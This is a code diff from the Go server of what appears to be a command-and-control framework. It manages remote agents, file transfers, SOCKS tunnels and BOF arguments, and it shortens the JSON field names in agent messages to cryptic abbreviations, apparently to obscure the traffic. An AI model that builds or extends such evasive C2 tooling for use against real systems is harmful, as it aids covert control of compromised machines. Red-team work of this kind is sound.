@@ -37,12 +37,12 @@ func (s *GRPCServer) QueueUploadNextChunk(agentID string, chunkDir string) error
 }
 
 type FileTransferJob struct {
-	JobID       int    `json:"job_id"`
+	JobID       int    `json:"ji"`
 	Type        string `json:"type"` // "upload" or "download"
-	Filename    string `json:"filename"`
-	Progress    int    `json:"progress"` // percentage
-	CurrentSize int64  `json:"current_size"`
-	TotalSize   int64  `json:"total_size"`
+	Filename    string `json:"fn"`
+	Progress    int    `json:"pg"` // percentage
+	CurrentSize int64  `json:"cs"`
+	TotalSize   int64  `json:"sz"`
 }
 
 // ADD: StreamConnection struct for tracking connections
@@ -196,18 +196,18 @@ func (s *GRPCServer) GetActiveTransfers(agentID string) []*ActiveTransfer {
 }
 
 type Command struct {
-	CommandType  int    `json:"command_type"`  // Numeric command ID (see commands.registry)
-	Command      string `json:"command"`       // Full command string with args (for parsing)
-	CommandID    string `json:"command_id"`
-	CommandDBID  int    `json:"command_db_id"`
-	AgentID      string `json:"agent_id"`
-	Filename     string `json:"filename"`
-	RemotePath   string `json:"remote_path"`
-	CurrentChunk int    `json:"currentChunk"`
-	TotalChunks  int    `json:"totalChunks"`
+	CommandType  int    `json:"ct"`  // Numeric command ID (see commands.registry)
+	Command      string `json:"co"`       // Full command string with args (for parsing)
+	CommandID    string `json:"ci"`
+	CommandDBID  int    `json:"cb"`
+	AgentID      string `json:"ai"`
+	Filename     string `json:"fn"`
+	RemotePath   string `json:"rp"`
+	CurrentChunk int    `json:"cc"`
+	TotalChunks  int    `json:"tc"`
 	Data         string `json:"data"`
-	Arguments    string `json:"arguments"`     // Base64-encoded packed BOF arguments
-	Timestamp    string `json:"timestamp"`
+	Arguments    string `json:"ar"`     // Base64-encoded packed BOF arguments
+	Timestamp    string `json:"ts"`
 }
 
 // CommandBuffer now stores Command objects instead of strings
@@ -217,12 +217,12 @@ type CommandBuffer struct {
 }
 
 type SocksCommandData struct {
-	Action      string             `json:"action"`
-	SocksPort   int                `json:"socks_port"`
-	WSSPort     int                `json:"wss_port"`
-	WSSHost     string             `json:"wss_host"`
+	Action      string             `json:"at"`
+	SocksPort   int                `json:"sp"`
+	WSSPort     int                `json:"wp"`
+	WSSHost     string             `json:"wh"`
 	Path        string             `json:"path"`
-	Credentials *socks.Credentials `json:"credentials"`
+	Credentials *socks.Credentials `json:"cr"`
 }
 
 func NewCommandBuffer() *CommandBuffer {
@@ -781,6 +781,7 @@ func (s *GRPCServer) NotifyNewConnection(ctx context.Context, notification *pb.C
 	}
 
 	// Create a sanitized message for broadcast that excludes secrets
+	// JSON field names must match websocket/agent/client.go HandleNewConnection expectations
 	connectionData := struct {
 		NewClientID    string `json:"new_client_id"`
 		ClientID       string `json:"client_id"`
@@ -1064,6 +1065,7 @@ func (s *GRPCServer) BroadcastLastSeen(agentID string, timestamp int64) error {
 		})
 	}
 
+	// JSON field names must match websocket/agent/client.go handleAgentCheckin expectations
 	checkinData := struct {
 		Type string `json:"type"`
 		Data struct {
@@ -1124,16 +1126,16 @@ func (s *GRPCServer) BroadcastLinkUpdate(agentID string, parentClientID string, 
 	linkUpdateData := struct {
 		Type string `json:"type"`
 		Data struct {
-			AgentID        string `json:"agent_id"`
-			ParentClientID string `json:"parent_client_id"`
-			LinkType       string `json:"link_type"`
+			AgentID        string `json:"ai"`
+			ParentClientID string `json:"pc"`
+			LinkType       string `json:"lt"`
 		} `json:"data"`
 	}{
 		Type: "link_update",
 		Data: struct {
-			AgentID        string `json:"agent_id"`
-			ParentClientID string `json:"parent_client_id"`
-			LinkType       string `json:"link_type"`
+			AgentID        string `json:"ai"`
+			ParentClientID string `json:"pc"`
+			LinkType       string `json:"lt"`
 		}{
 			AgentID:        agentID,
 			ParentClientID: parentClientID,
@@ -1396,6 +1398,7 @@ func (s *GRPCServer) stopSocksServer(socksData map[string]interface{}) error {
 func (s *GRPCServer) processReceivedMessage(msg *pb.StreamMessage) {
 	switch msg.Type {
 	case "agent_command":
+		// JSON field names must match what websocket/handlers sends
 		var commandData struct {
 			Command      string `json:"command"`
 			AgentID      string `json:"agent_id"`
